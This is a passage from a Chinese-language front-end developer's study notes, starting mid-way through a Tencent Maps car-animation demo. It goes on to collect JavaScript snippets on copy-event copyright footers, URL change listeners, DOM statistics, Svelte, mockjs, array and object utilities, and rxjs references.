  <script charset="utf-8" src="https://map.qq.com/api/gljs?v=1.exp&key=QSWBZ-AL2KU-4Q4VI-46ONV-26OOT-ISB5G"></script>
  <style type="text/css">
    html,
    body {
      height: 100%;
      margin: 0px;
      padding: 0px;
    }

    #container {
      width: 100%;
      height: 100%;
    }
  </style>

  <body>
    <div id="container"></div>
    <script type="text/javascript">
      var center = new TMap.LatLng(39.984104, 116.307503);
      //初始化地图
      var map = new TMap.Map("container", {
        zoom: 15,
        center: center
      });

      var path = [
        new TMap.LatLng(39.98481500648338, 116.30571126937866),
        new TMap.LatLng(39.982266575222155, 116.30596876144409),
        new TMap.LatLng(39.982348784165886, 116.3111400604248),
        new TMap.LatLng(39.978813710266024, 116.3111400604248),
        new TMap.LatLng(39.978813710266024, 116.31699800491333)
      ];

      var polylineLayer = new TMap.MultiPolyline({
        map, // 绘制到目标地图
        // 折线样式定义
        styles: {
          'style_blue': new TMap.PolylineStyle({
            'color': '#3777FF', //线填充色
            'width': 4, //折线宽度
            'borderWidth': 2, //边线宽度
            'borderColor': '#FFF', //边线颜色
            'lineCap': 'round' //线端头方式
          })
        },
        geometries: [{
          styleId: 'style_blue',
          paths: path
        }],
      });

      var marker = new TMap.MultiMarker({
        map,
        styles: {
          'car-down': new TMap.MarkerStyle({
            'width': 40,
            'height': 40,
            'anchor': {
              x: 20,
              y: 20,
            },
            'faceTo': 'map',
            'rotate': 180,
            'src': 'https://mapapi.qq.com/web/lbs/javascriptGL/demo/img/car.png',
          }),
          "start": new TMap.MarkerStyle({
            "width": 25,
            "height": 35,
            "anchor": { x: 16, y: 32 },
            "src": 'https://mapapi.qq.com/web/lbs/javascriptGL/demo/img/start.png'
          }),
          "end": new TMap.MarkerStyle({
            "width": 25,
            "height": 35,
            "anchor": { x: 16, y: 32 },
            "src": 'https://mapapi.qq.com/web/lbs/javascriptGL/demo/img/end.png'
          })
        },
        geometries: [{
          id: 'car',
          styleId: 'car-down',
          position: new TMap.LatLng(39.98481500648338, 116.30571126937866),
        }, {
          "id": 'start',
          "styleId": 'start',
          "position": new TMap.LatLng(39.98481500648338, 116.30571126937866)
        }, {
          "id": 'end',
          "styleId": 'end',
          "position": new TMap.LatLng(39.978813710266024, 116.31699800491333)
        }]
      });

      marker.moveAlong({
        'car': {
          path,
          speed: 250
        }
      }, {
        autoRotation: true
      })
    </script>
  </body>

  </html>
  ```

### 页面复制文字时自动加版权

1.  参考链接：

    [JS 实现页面复制文字时自动加版权](https://blog.csdn.net/lzuacm/article/details/88197591)

2.  详解：

    利用 chrome 查看网站触发某事件(如 copy)时的代码:

        F12-source-Event Listener Breakpoints-选择事件打勾-触发事件
    
        可以看到csdn使用copyright.js，百度即可，或搜索“js加版权”

    ```js
    $(document).on("copy", function (e) {
      var selected = window.getSelection();
      var selectedText = selected.toString().replace(/\n/g, "<br>");
      var copyFooter =
        "<br>---------------------<br>著作权归作者所有。<br>" +
        "商业转载请联系作者获得授权，非商业转载请注明出处。<br>" +
        "作者：Bravo Yeung<br> 源地址：" +
        document.location.href +
        "<br>来源：博客园cnblogs<br>© 版权声明：本文为博主原创文章，转载请附上博文链接！";
      var copyHolder = $("<div>", {
        id: "temp",
        html: selectedText + copyFooter,
        style: { position: "absolute", left: "-99999px" },
      });
      //创建div，内容为选中的文字+附加的内容，位置设为不可见
      $("body").append(copyHolder);
      selected.selectAllChildren(copyHolder[0]); //把指定元素的所有子元素设为选中区域，并取消之前的选中区域
      window.setTimeout(function () {
        copyHolder.remove();
      }, 0);
    });
    ```

    ```js
    var ua = navigator.userAgent.toLowerCase();
    if (window.ActiveXObject) {
      /* 兼容IE */
      document.body.oncopy = function () {
        event.returnValue = false;
        var selectedText = document.selection.createRange().text;
        var pageInfo =
          "<br>---------------------<br>著作权归作者所有。<br>" +
          "商业转载请联系作者获得授权，非商业转载请注明出处。<br>" +
          "作者：Bravo Yeung<br> 源地址：" +
          document.location.href +
          "<br>来源：博客园cnblogs<br>© 版权声明：本文为博主原创文章，转载请附上博文链接！";
        clipboardData.setData(
          "Text",
          selectedText.replace(/\n/g, "<br>") + pageInfo
        );
      };
    } else {
      function addCopyRight() {
        var body_element = document.getElementsByTagName("body")[0];
        var selection = window.getSelection();
        var pageInfo =
          "<br>---------------------<br>著作权归作者所有。<br>" +
          "商业转载请联系作者获得授权，非商业转载请注明出处。<br>" +
          "作者：Bravo Yeung<br> 源地址：" +
          document.location.href +
          "<br>来源：博客园cnblogs<br>© 版权声明：本文为博主原创文章，转载请附上博文链接！";
        var copyText = selection.toString().replace(/\n/g, "<br>") + pageInfo;
        var newDiv = document.createElement("div");
        newDiv.style.position = "absolute";
        newDiv.style.left = "-99999px";
        body_element.appendChild(newDiv);
        newDiv.innerHTML = copyText;
        selection.selectAllChildren(newDiv);
        window.setTimeout(function () {
          body_element.removeChild(newDiv);
        }, 0);
      }
      document.oncopy = addCopyRight;
    }
    ```

### js监听url变化

1. 参考链接：

  - [如何监听URL的变化？](https://blog.csdn.net/liubangbo/article/details/103272393)

2. 详解

  * 监听hashchange:#改变触发

    ```js
    window.onhashchange=function(event){
      console.log(event);
    }
    //或者
    window.addEventListener('hashchange',function(event){
      console.log(event);
    })
    ```

  * 监听popstate:前进后退触发

    ```js
    window.addEventListener('popstate', function(event) {
        console.log(event);
    })
    ```

  * 自定义事件replaceState和pushState行为的监听:单页面应用url改变能生效

    ```js
    let historyEvent = function(type) {
        let origin = history[type];
        return function() {
            let result = origin.apply(this, arguments);
            let event = new Event(type);
            event.arguments = arguments;
            window.dispatchEvent(event);
            return result;
        };
    };
    history.pushState = historyEvent('pushState');
    history.replaceState = historyEvent('replaceState');

    window.addEventListener('replaceState', function(e) {
      console.log('THEY DID IT AGAIN! replaceState 111111');
    });
    window.addEventListener('pushState', function(e) {
      console.log('THEY DID IT AGAIN! pushState 2222222');
    });
    ```

### 如何找到当前页面出现次数最多的HTML标签

1. 参考链接：

  - [山月最近的面试总结](https://juejin.cn/post/6922229465468633095)
  - [「万字总结」熬夜总结50个JS的高级知识点，全都会你就是神！！！](https://juejin.cn/post/7022795467821940773)

2. 详解

  * 列出所有标签

    1. document.querySelector('*')，标准规范实现
    2. $$('*')，devtools 实现
    3. document.all，非标准规范实现
    4. createNodeIterator(IE9+)

      ```js
      const body = document.getElementsByTagName('body')[0]
      const it = document.createNodeIterator(body)
      let root = it.nextNode()
      while(root) {
          console.log(root)
          root = it.nextNode()
      }
      ```

  * 实现

    使用 document.querySelectorAll 实现

    ```js
    const maxBy = (list, keyBy) => list.reduce((x, y) => keyBy(x) > keyBy(y) ? x : y)

    function getFrequentTag () {
      const tags = [...document.querySelectorAll('*')].map(x => x.tagName).reduce((o, tag) => { 
        o[tag] = o[tag] ? o[tag] + 1 : 1;
        return o
      }, {})
      return maxBy(Object.entries(tags), tag => tag[1])
    }
    ```

    DOM 的体积过大会影响页面性能，假如你想在用户关闭页面时统计（计算并反馈给服务器）当前页面中元素节点的数量总和、元素节点的最大嵌套深度以及最大子元素个数，请用 JS 配合原生 DOM API 实现该需求（不用考虑陈旧浏览器以及在现代浏览器中的兼容性，可以使用任意浏览器的最新特性；不用考虑 shadow DOM）。比如在如下页面中运行后：
    ```html
    <html>
      <head></head>
      <body>
        <div>
          <span>f</span>
          <span>o</span>
          <span>o</span>
        </div>
      </body>
    </html>
    ```
    ```json
    {
      totalElementsCount: 7,
      maxDOMTreeDepth: 4,
      maxChildrenCount: 3
    }
    ```

    ```js
    window.onload = function() {
      let outer = document.querySelectorAll('*');
      let totalElementsCount = 0;
      let maxDOMTreeDepth = 0;
      let maxChildrenCount = 0;
      //console.log(outer)
      let elementQueue = [outer[0]];
      let htmlObject = {
        tagName: '',
        deep: 0,
        childrenCount: 0
      };
      let nodeInfo = [];
      let deepInfo = [];
      let childrenCountInfo = [];
      let currentDeep = 1;

      while(elementQueue.length != 0){
        for(let i = 0;i < elementQueue.length;i++){
          let info = JSON.parse(JSON.stringify(htmlObject));
          info.tagName = elementQueue[i].tagName;
          info.deep = currentDeep;
          info.childrenCount = elementQueue[i].childElementCount;
          nodeInfo.push(info);
          deepInfo.push(info.deep);
          childrenCountInfo.push(info.childrenCount);
        }
        //console.log(nodeInfo)
        let newQueue = [];
        for(let i = 0;i < elementQueue.length;i++){
          if(elementQueue[i].hasChildNodes()){
            //console.log(elementQueue[i].children)
            Array.prototype.push.apply(newQueue,elementQueue[i].children);
          }
        }
        //console.log(newQueue)
        elementQueue = newQueue;
        currentDeep++;
      }
      deepInfo = deepInfo.sort((a,b)=>(b-a));
      childrenCountInfo = childrenCountInfo.sort((a,b)=>(b-a));

      totalElementsCount = nodeInfo.length;
      maxDOMTreeDepth = deepInfo[0];
      maxChildrenCount = childrenCountInfo[0];
      console.log({
        totalElementsCount: totalElementsCount,
        maxDOMTreeDepth: maxDOMTreeDepth,
        maxChildrenCount: maxChildrenCount
      })
    }
    ```

### 基准URL与刷新重定向

1. 参考链接：

  - [HTML <base> 标签的 href 属性](https://www.w3school.com.cn/tags/att_base_href.asp)
  - [5个不常提及的HTML技巧](https://mp.weixin.qq.com/s/Sr6GwTdoQrMoyBZ5BWmo_g)

2. 详解

  使用base后，如果不是完整链接，则变为base+后缀的链接，对于完整链接则不变
  ```html
  <head>
    <base href="https://www.weibo.com/" target="_blank">  
  </head>
  <body>
    <a href="jackiechan">成龙</a>
    <a href="kukoujialing">贾玲</a>
    <img src="eg_smile.gif" />
    <a href="https://www.baidu.com/">百度</a>
  </body>
  ```

  刷新重定向
  ```html
  <meta http-equiv="refresh" content="4; URL='https://www.baidu.com'" />
  ```

### Svelte

1. 参考链接：

  - [都快2020年，你还没听说过SvelteJS?](https://zhuanlan.zhihu.com/p/97825481)
  - [Svelte文档](https://www.sveltejs.cn/)
  - [如何看待 svelte 这个前端框架？](https://www.zhihu.com/question/53150351)

2. 详解

  * Svelte解决的问题

    Svelte 的核心思想在于『通过静态编译减少框架运行时的代码量』

    框架无论是 React Angular 还是 Vue，不管你怎么编译，使用的时候必然需要『引入』框架本身，也就是所谓的运行时 (runtime)。

    一个 Svelte 组件编译了以后，所有需要的运行时代码都包含在里面了，除了引入这个组件本身，你不需要再额外引入一个所谓的框架运行时

  * 编译规则

    编译前
    ```html
    <a>{{ msg }}</a>
    ```

    编译后
    ```js
    function renderMainFragment ( root, component, target ) {
      var a = document.createElement( 'a' );
      
      var text = document.createTextNode( root.msg );
      a.appendChild( text );
      
      target.appendChild( a )

      return {
        update: function ( changed, root ) {
          text.data = root.msg;
        },

        teardown: function ( detach ) {
          if ( detach ) a.parentNode.removeChild( a );
        }
      };
    }
    ```

  * 优点

    * 不需要 Virtual DOM 的 diff/patch 操作，自然可以省去大量代码
    * 在编译时，如果一个功能没用到，对应的代码就根本不会被编译到结果里去

  * 缺点

    * 项目里的组件越多，代码量的差异就会逐渐缩小，大型项目反而没有优势
    * 它的更新策略也需要类似 React 的 shouldComponentUpdate 的机制来防止过度更新，比起现在的主流框架并不是质的区别
    * 享受不到 Virtual DOM 带来的诸多好处，比如基于 render function 的组件的强大抽象能力，基于 vdom 做测试，服务端/原生渲染亲和性

### mockjs

1. 参考链接：

  - [mockjs](http://mockjs.com/)

2. 详解

* 安装

  npm install mockjs

* 使用

  * 基础

    ```js
    Mock.mock({
      //规则
    })
    ```

  * 数据类型

    String、Number、Boolean、Object、Array、Function、RegExp、Path

  * 规则

    * 递增出现：形如+1

      ```js
      Mock.mock({
        "number|+1": 4384//"number": 4282
      })
      ```

    * 固定出现次数：形如1

      ```js
      Mock.mock({
        "object|2": {
          "310000": "上海市",
          "320000": "江苏省",
          "330000": "浙江省",
          "340000": "安徽省"
        }
      })
      
      //{
      //  "object": {
      //    "330000": "浙江省",
      //    "340000": "安徽省"
      //  }
      //}
      ```

    * 范围：形如1-100

      ```js
      Mock.mock({
        "number|1-100.1-10": 1 //"number": 68.5741
      })
      ```

    * 特殊类型

      ```js
      Mock.mock({
        'regexp': /[a-z][A-Z][0-9]/ //"regexp": "dN1"
      })

      Random.image('200x100', '#894FC4', '#FFF', 'png', '!')

      Mock.mock('@color')
      ```

    * 占位符

      ```js
      Random.float(60, 100, 3, 5)//72.0482
      Mock.mock('@float(60, 100, 3, 5)')//91.74716
      ```

### 简单实现双向数据绑定mvvm

1. 参考链接：

   [一年半经验，百度，有赞，阿里前端面试总结](https://zhuanlan.zhihu.com/p/83803079)

2. 详解：

   ```js
   <input id="input" />;
   const data = {};
   const input = document.getElementById("input");
   Object.defineProperty(data, "text", {
     set(value) {
       input.value = value;
       this.value = value;
     },
   });
   input.onchange = function (e) {
     data.text = e.target.value;
   };
   ```

### 便捷的函数与方法

1. 参考链接：

   - [前端常见 20 道高频面试题深入解析](https://mp.weixin.qq.com/s/jx-4p32EA9cHkDzll3BoYQ)

   - [Javascript 实现嵌套数组扁平化](https://www.cnblogs.com/codejoker/p/10370262.html)

   - [前端面试大厂手写源码系列（上）](https://juejin.im/post/5e77888ff265da57187c7278#heading-16)

   - [十道大厂面试题(含答案)总结](https://mp.weixin.qq.com/s/o553cr1FHLz40PpxbO8oOw)

   - [js 对象的扁平化与反扁平化](https://www.cnblogs.com/mengff/p/7097011.html)

   - [11 个 JavaScript 小技巧](https://mp.weixin.qq.com/s/qBuTTXzt7ZNFttXwu5ryMw)

   - [js 去除数组中的空值,假值](https://blog.csdn.net/zzwwjjdj1/article/details/78642552)

   - [js 用 Set 实现并集（Union）、交集（Intersect）和差集（Difference）](https://blog.csdn.net/mhbsoft/article/details/81487826)

   - [JS 的对象数组去重处理(二十)](https://blog.csdn.net/yjltx1234csdn/article/details/93766707)

   - [JavaScript 工具函数大全（持续更新）](https://github.com/Wscats/CV/issues/27)

   - [【适合收藏】为了多点时间陪女朋友，我向BAT大佬跪求了这15条JS技巧](https://juejin.im/post/5f15444df265da22c9671b03)

   - [js实现trim方法](https://www.cnblogs.com/wayowe/p/7779555.html)

   - [实现一个数组（包含对象等类型元素）去重函数](https://mp.weixin.qq.com/s/UAnAMDMt2dAsYMFXYn5G9Q)

   - [JavaScript replace() 方法](https://www.w3school.com.cn/jsref/jsref_replace.asp)

2. 详解

   - 嵌套数组扁平化

     es6 flat(扁平层数)

     ```js
     var testArr = [10, 2, [3, 4, [5, [55]]]];
     testArr.flat(Infinity);
     ```

     toString

     ```js
     var testArr = [10, 2, [3, 4, [5, [55]]]]
     [...testArr.toString().split(',')]
     ```

     join/split/map

     ```js
     var testArr = [10, 2, [3, 4, [5, [55]]]];
     testArr.toString().split(",").map(Number);
     testArr.join().split(",").map(Number);
     ```

     包含非数字类型

     ```js
     const flattern = (arr) => {
       const result = [];
       arr.forEach((item) => {
         if (Array.isArray(item)) {
           result.push(...flattern(item));
         } else {
           result.push(item);
         }
       });
       return result;
     };
     ```

   - 嵌套对象的扁平化和反扁平化

     扁平化输入

     ```js
     var obj = {
       a: {
         b: {
           c: {
             d: 1,
           },
         },
       },
       aa: 2,
       c: [1, 2],
     };
     ```

     输出

     ```js
     { 'a.b.c.d': 1, 'aa': 2, 'c[0]': 1, 'c[1]': 2 }
     ```

     扁平化 1

     ```js
     let str = "";
     let o = {};
     function objFlatten(obj) {
       Object.keys(obj).map((item) => {
         if (Object.prototype.toString.call(obj[item]) === "[object Object]") {
           //如果是对象，记录"item1.item2.",不断递归
           str += item + ".";
           objFlatten(obj[item]);
         } else if (
           Object.prototype.toString.call(obj[item]) === "[object Array]"
         ) {
           //如果是数组，向对象循环添加属性，o.c[0]，o.c[1]
           obj[item].forEach((ele, index) => (o[item + `[${index}]`] = ele));
         } else {
           //如果是基础类型,加入最后的item变为"item1.item2.item3",向o添加str记录的属性并赋值，清空str
           str += item;
           o[str] = obj[item];
           str = "";
         }
       });
     }
     ```

     扁平化 2

     ```js
     Object.flatten = function (obj) {
       var result = {};

       function recurse(src, prop) {
         var toString = Object.prototype.toString;
         if (toString.call(src) == "[object Object]") {
           var isEmpty = true;
           for (var p in src) {
             isEmpty = false;
             recurse(src[p], prop ? prop + "." + p : p);
           }
           if (isEmpty && prop) {
             result[prop] = {};
           }
         } else if (toString.call(src) == "[object Array]") {
           var len = src.length;
           if (len > 0) {
             src.forEach(function (item, index) {
               recurse(item, prop ? prop + ".[" + index + "]" : index);
             });
           } else {
             result[prop] = [];
           }
         } else {
           result[prop] = src;
         }
       }
       recurse(obj, "");

       return result;
     };
     ```

     反扁平化 1

     ```js
     Object.unflatten = function (data) {
       if (Object(data) !== data || Array.isArray(data)) return data;
       var regex = /\.?([^.\[\]]+)|\[(\d+)\]/g,
         resultholder = {};
       for (var p in data) {
         var cur = resultholder,
           prop = "",
           m;
         while ((m = regex.exec(p))) {
           cur = cur[prop] || (cur[prop] = m[2] ? [] : {});
           prop = m[2] || m[1];
         }
         cur[prop] = data[p];
       }
       return resultholder[""] || resultholder;
     };
     ```

     反扁平化 2

     ```js
     Object.unflatten2 = function (data) {
       if (Object(data) !== data || Array.isArray(data)) return data;
       var result = {},
         cur,
         prop,
         idx,
         last,
         temp;
       for (var p in data) {
         (cur = result), (prop = ""), (last = 0);
         do {
           idx = p.indexOf(".", last);
           temp = p.substring(last, idx !== -1 ? idx : undefined);
           cur = cur[prop] || (cur[prop] = !isNaN(parseInt(temp)) ? [] : {});
           prop = temp;
           last = idx + 1;
         } while (idx >= 0);
         cur[prop] = data[p];
       }
       return result[""];
     };
     ```

   - 数组去重

     set

     ```js
     var testArr = [1,2,2,3,4,4]
     [... new Set(testArr)]
     ```

     处理对象

     ```js
     let arr1 = [
       { id: 1, name: "汤小梦" },
       { id: 2, name: "石小明" },
       { id: 3, name: "前端开发" },
       { id: 1, name: "web前端" },
     ];
     const unique = (arr, key) => {
       return [...new Map(arr.map((item) => [item[key], item])).values()];
     };
     console.log(unique(arr1, "id"));
     ```

   - 合并数组

     es5

     ```js
     let arr5 = arr3.concat(arr4);
     ```

     es6

     ```js
     let arr6 = [...arr3, ...arr4];
     ```

   - 是否为数组

     instanceof

     ```js
     console.log(arr instanceof Array);
     ```

     constructor

     ```js
     console.log(arr.constructor === Array);
     ```

     是否数组的方法

     ```js
     console.log(!!arr.push && !!arr.concat);
     ```

     toString

     ```js
     console.log(Object.prototype.toString.call(arr) === "[object Array]");
     ```

     isArray

     ```js
     console.log(Array.isArray(arr));
     ```

   - 交换两个数

     ```js
     a = a + b;
     b = a - b;
     a = a - b;
     //或
     a = a ^ b;
     b = a ^ b;
     a = a ^ b;
     ```

   - 快速浮点数转整数

     ```js
     console.log(23.9 | 0); // Result: 23
     console.log(-23.9 | 0); // Result: -23
     ```

   - 删除最后一个数字

     ```js
     let str = "1553";
     Number(str.substring(0, str.length - 1));

     console.log((1553 / 10) | 0); // Result: 155
     console.log((1553 / 100) | 0); // Result: 15
     console.log((1553 / 1000) | 0); // Result: 1
     ```

   - 去除数组中的空值,假值

     ```js
     var u = [undefined, undefined, 1, "", "false", false, true, null, "null"];
     u.filter((d) => d);
     ```

   - Set 实现并集（Union）、交集（Intersect）和差集（Difference）

     ```js
     let a = new Set([1, 2, 3]);
     let b = new Set([4, 3, 2]);

     // 并集
     let union = new Set([...a, ...b]);
     // Set {1, 2, 3, 4}

     // 交集
     let intersect = new Set([...a].filter((x) => b.has(x))); //ES6
     var intersect = new Set(
       [...a].filter(function (x) {
         return b.has(x);
       })
     );
     // set {2, 3}

     // 差集
     let difference = new Set([...a].filter((x) => !b.has(x)));
     // Set {1}
     ```

   - 对象数组去重

     ```js
     let arr = [
       { a: 1, b: 2 },
       { b: 2, a: 1 },
       { a: 2, b: 2 },
       { a: "1", b: "2" },
     ];
     let sortObjectByKeys = (obj) => {
       let keys = Object.keys(obj).sort();
       let newObj = {};
       keys.forEach((value, index, array) => {
         newObj[value] = obj[value];
       });
       return newObj;
     };
     let uniqueObjectArray = (arr) => {
       let set = new Set();
       arr.forEach((value, index, array) => {
         let newValue = sortObjectByKeys(value);
         set.add(JSON.stringify(newValue));
       });
       let newArr = [...set];
       newArr.forEach((value, index, array) => {
         newArr[index] = JSON.parse(value);
       });
       return newArr;
     };
     console.log(uniqueObjectArray(arr));
     ```

   - 平滑滚动到页面顶部

     ```js
     function scrollToTop() {
       var c = document.documentElement.scrollTop || document.body.scrollTop;

       if (c > 0) {
         window.requestAnimationFrame(scrollToTop);
         window.scrollTo(0, c - c / 8);
       }
     }
     ```

   - 日期格式转换

     ```js
     Date.prototype.format = function (formatStr) {
       var str = formatStr;
       var Week = ["日", "一", "二", "三", "四", "五", "六"];
       str = str.replace(/yyyy|YYYY/, this.getFullYear());
       str = str.replace(
         /yy|YY/,
         this.getYear() % 100 > 9
           ? (this.getYear() % 100).toString()
           : "0" + (this.getYear() % 100)
       );
       str = str.replace(
         /MM/,
         this.getMonth() + 1 > 9
           ? (this.getMonth() + 1).toString()
           : "0" + (this.getMonth() + 1)
       );
       str = str.replace(/M/g, this.getMonth() + 1);
       str = str.replace(/w|W/g, Week[this.getDay()]);
       str = str.replace(
         /dd|DD/,
         this.getDate() > 9 ? this.getDate().toString() : "0" + this.getDate()
       );
       str = str.replace(/d|D/g, this.getDate());
       str = str.replace(
         /hh|HH/,
         this.getHours() > 9
           ? this.getHours().toString()
           : "0" + this.getHours()
       );
       str = str.replace(/h|H/g, this.getHours());
       str = str.replace(
         /mm/,
         this.getMinutes() > 9
           ? this.getMinutes().toString()
           : "0" + this.getMinutes()
       );
       str = str.replace(/m/g, this.getMinutes());
       str = str.replace(
         /ss|SS/,
         this.getSeconds() > 9
           ? this.getSeconds().toString()
           : "0" + this.getSeconds()
       );
       str = str.replace(/s|S/g, this.getSeconds());
       return str;
     };

     // 或
     Date.prototype.format = function (format) {
       var o = {
         "M+": this.getMonth() + 1, //month
         "d+": this.getDate(), //day
         "h+": this.getHours(), //hour
         "m+": this.getMinutes(), //minute
         "s+": this.getSeconds(), //second
         "q+": Math.floor((this.getMonth() + 3) / 3), //quarter
         S: this.getMilliseconds(), //millisecond
       };
       if (/(y+)/.test(format))
         format = format.replace(
           RegExp.$1,
           (this.getFullYear() + "").substr(4 - RegExp.$1.length)
         );
       for (var k in o) {
         if (new RegExp("(" + k + ")").test(format))
           format = format.replace(
             RegExp.$1,
             RegExp.$1.length == 1
               ? o[k]
               : ("00" + o[k]).substr(("" + o[k]).length)
           );
       }
       return format;
     };

     alert(new Date().format("yyyy-MM-dd hh:mm:ss"));
     ```

   - 返回日期数列里与目标数列最近的日期下标

      ```js
      const getNearestDateIndex = (targetDate, dates) => {
          if (!targetDate || !dates) {
              throw new Error('Argument(s) is illegal !')
          }
          if (!dates.length) {
              return -1
          }
          const distances = dates.map(date => Math.abs(date - targetDate))
          return distances.indexOf(Math.min(...distances))
      }

      // e.g.
      const targetDate = new Date(2019, 7, 20)
      const dates = [
        new Date(2018, 0, 1),
        new Date(2019, 0, 1),
        new Date(2020, 0, 1),
      ]
      getNearestDateIndex(targetDate, dates) // 2
      ```

   - 返回日期数列里最小的日期

      ```js
      const getMinDate = dates => {
          if (!dates) {
              throw new Error('Argument(s) is illegal !')
          }
          if (!dates.length) {
              return dates
        }
          return new Date(Math.min.apply(null, dates)).toISOString()
      }

      // e.g.
      const dates = [
        new Date(2018, 3, 10),
        new Date(2019, 3, 10),
        new Date(2020, 3, 10),
      ]
      getMinDate(dates) // 2018-04-09T16:00:00.000Z
      ```

   - 打乱数组

      ```js
      const arrayShuffle = array => {
          if (!Array.isArray(array)) {
              throw new Error('Argument must be an array')
        }
          let end = array.length
          if (!end) {
              return array
          }
          while (end) {
              let start = Math.floor(Math.random() * end--);
              [array[start], array[end]] = [array[end], array[start]]
          }
          return array
      }

      // e.g.
      arrayShuffle([1, 2, 3])
      ```

   - 判断是否支持webp图片格式

      ```js
      const canUseWebp = () => (document.createElement('canvas').toDataURL('image/webp', 0.5).indexOf('data:image/webp') === 0)

      // e.g.
      canUseWebp() // 新版的chrome里为true，火狐里为false
      ```

   - 连字符与驼峰互转

      ```js
      const toCamelCase = (str = '', separator = '-') => {
          if (typeof str !== 'string') {
              throw new Error('Argument must be a string')
          }
          if (str === '') {
              return str
          }
          const newExp = new RegExp('\\-\(\\w\)', 'g')
          return str.replace(newExp, (matched, $1) => {
              return $1.toUpperCase()
          })
      }

      // e.g.
      toCamelCase('hello-world') // helloWorld

      const fromCamelCase = (str = '', separator = '-') => {
          if (typeof str !== 'string') {
              throw new Error('Argument must be a string')
          }
          if (str === '') {
              return str
          }
          return str.replace(/([A-Z])/g, `${separator}$1`).toLowerCase()
      }

      // e.g.
      fromCamelCase('helloWorld') // hello-world
      ```

   - 等级判断

      ```js
      const getLevel = (value = 0, ratio = 50, levels = '一二三四五') => {
          if (typeof value !== 'number') {
              throw new Error('Argument must be a number')
          }
          const levelHash = '一二三四五'.split('')
        const max = levelHash[levelHash.length - 1]
        return levelHash[Math.floor(value / ratio)] || max
      }

      // e.g.
      getLevel(0) // 一
      getLevel(40) // 一
      getLevel(77) // 二
      ```

   - 判断dom是否相等

      ```js
      const isEqualNode = (dom1, dom2) => dom1.isEqualNode(dom2)
      ```

   - 文件尺寸格式化

      ```js
      const formatSize = size => {
          if (typeof +size !== 'number') {
              throw new Error('Argument(s) is illegal !')
        }
          const unitsHash = 'B,KB,MB,GB'.split(',')
          let index = 0
          while (size > 1024 && index < unitsHash.length) {
              size /= 1024
              index++
          }
          return Math.round(size * 100) / 100 + unitsHash[index]
      }
      formatSize('10240') // 10KB
      formatSize('10240000') // 9.77MB
      ```

   - trim与其它去空格方法

      ```js
      String.prototype.trim = function(){
          return this.replace(/^(\s*)|(\s*)$/g, '');
      }
      '  a aaa bbb  b  c cc  ccc   '.replace(/(\S)\s+(\b)/g,'$1$2'); // "  aaaabbbbcccccc   "
      ```

   - 复杂类型数组去重

      1. 如传入的数组元素为 [123, "meili", "123", "mogu", 123] ，则输出： [123, "meili", "123", "mogu"]
      2. 如传入的数组元素为 [123, [1, 2, 3], [1, "2", 3], [1, 2, 3], "meili"] ，则输出： [123, [1, 2, 3], [1, "2", 3], "meili"]
      3. 如传入的数组元素为 [123, {a: 1}, {a: {b: 1}}, {a: "1"}, {a: {b: 1}}, "meili"] ，则输出： [123, {a: 1}, {a: {b: 1}}, {a: "1"}, "meili"]
      4. 如传入的数组元素为 [{a:1, b:2}, {b:2, a:1}] ，则输出： [{a: 1, b: 2}]

      * 解决思路：

      一个数组（包含对象等类型元素）去重函数，需要在基础类型判断相等条件下满足以下条件：

      如果元素是数组类型，则需要数组中的每一项相等
      如果元素是对象类型，则需要对象中的每个键值对相等
      去重本身就是遍历数组，然后比较数组中的每一项是否相等而已，所以关键步骤有两步：比较、去重

      * 比较：

      首先判断类型是否一致，类型不一致则返回认为两个数组元素是不同的，否则继续
      如果是数组类型，则递归比较数组中的每个元素是否相等
      如果是对象类型，则递归比较对象中的每个键值对是否相等
      否则，直接 === 比较
      
      * 去重：

      采用 reduce 去重，初始 accumulator 为 []
      采用 findIndex 找到 accumulator 是否包含相同元素，如果不包含则加入，否则不加入
      返回最终的 accumulator ，则为去重后的数组

      ```js
      // 获取类型
      const getType = (function() {
          const class2type = { '[object Boolean]': 'boolean', '[object Number]': 'number', '[object String]': 'string', '[object Function]': 'function', '[object Array]': 'array', '[object Date]': 'date', '[object RegExp]': 'regexp', '[object Object]': 'object', '[object Error]': 'error', '[object Symbol]': 'symbol' }

          return function getType(obj) {
              if (obj == null) {
                  return obj + ''
              }
              // javascript高级程序设计中提供了一种方法,可以通用的来判断原始数据类型和引用数据类型
              const str = Object.prototype.toString.call(obj)
              return typeof obj === 'object' || typeof obj === 'function' ? class2type[str] || 'object' : typeof obj
          };
      })();

      /**
      * 判断两个元素是否相等
      * @param {any} o1 比较元素
      * @param {any} o2 其他元素
      * @returns {Boolean} 是否相等
      */
      const isEqual = (o1, o2) => {
          const t1 = getType(o1)
          const t2 = getType(o2)

          // 比较类型是否一致
          if (t1 !== t2) return false
          
          // 类型一致
          if (t1 === 'array') {
              // 首先判断数组包含元素个数是否相等
              if (o1.length !== o2.length) return false 
              // 比较两个数组中的每个元素
              return o1.every((item, i) => {
                  // return item === target
                  return isEqual(item, o2[i])
              })
          }

          if (t2 === 'object') {
              // object类型比较类似数组
              const keysArr = Object.keys(o1)
              if (keysArr.length !== Object.keys(o2).length) return false
              // 比较每一个元素
              return keysArr.every(k => {
                  return isEqual(o1[k], o2[k])
              })
          }

          return o1 === o2
      }

      // 数组去重
      const removeDuplicates = (arr) => {
          return arr.reduce((accumulator, current) => {
              const hasIndex = accumulator.findIndex(item => isEqual(current, item))
              if (hasIndex === -1) {
                  accumulator.push(current)
              }
              return accumulator
          }, [])
      }

      // 测试
      removeDuplicates([123, {a: 1}, {a: {b: 1}}, {a: "1"}, {a: {b: 1}}, "meili", {a:1, b:2}, {b:2, a:1}])
      // [123, {a: 1}, a: {b: 1}, {a: "1"}, "meili", {a: 1, b: 2}]
      ```

   - replace正则占位符与函数

    ```js
    'product_123.html'.replace(/product_(\d+).html/,"/product/detail?id=$1")// /product/detail?id=123
    "Doe, John".replace(/(\w+)\s*, \s*(\w+)/, "$2 $1");// John, Doe
    '"a", "b"'.replace(/"([^"]*)"/g, "'$1'")//"'a', 'b'"
    'aaa bbb ccc'.replace(/\b\w+\b/g, function(word){
      return word.substring(0,1).toUpperCase()+word.substring(1);
    }//'Aaa Bbb Ccc'
    ```

### rxjs

1. 参考链接：

  - [如何快速使用 Rxjs](https://blog.csdn.net/weixin_37625953/article/details/80509827)

  - [异步复杂度要到什么程度才需要用到Rxjs？](https://www.zhihu.com/question/303073602)

  - [rxjs随笔1--rxjs能做什么](https://segmentfault.com/a/1190000020268578)

  - [RxJS快速入门](https://www.cnblogs.com/vcluopeng/p/14010904.html)

  - [RxJS: 简单入门](https://segmentfault.com/a/1190000012252368)

